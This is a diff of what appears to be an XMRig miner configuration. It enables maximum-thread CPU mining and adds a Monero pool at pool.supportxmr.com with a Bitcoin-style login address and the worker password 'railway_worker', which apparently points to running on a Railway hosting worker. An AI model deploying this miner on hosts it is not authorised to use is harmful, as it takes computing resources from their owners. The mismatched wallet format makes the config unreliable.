@@ -1,7 +1,26 @@
 {
-    "autosave": true,
+    "autosave": false,
+    "cpu": {
+        "enabled": true,
+        "huge-pages": true,
+        "hw-aes": true,
+        "max-threads-hint": 100,
+        "asm": true
+    },
+    "pools": [
+        {
+            "url": "pool.supportxmr.com:443",
+            "user": "bc1qtw65pnqwmtvgj7m3vm2ve5zk2s5fush4387976",
+            "pass": "railway_worker",
+            "tls": true,
+            "keepalive": true,
+            "nicehash": false
+        }
+    ],
     "donate-level": 1,
-    "cpu": true,
     "opencl": false,
-    "cuda": false
+    "cuda": false,
+    "print-time": 60,
+    "retries": 5,
+    "retry-pause": 5
 }
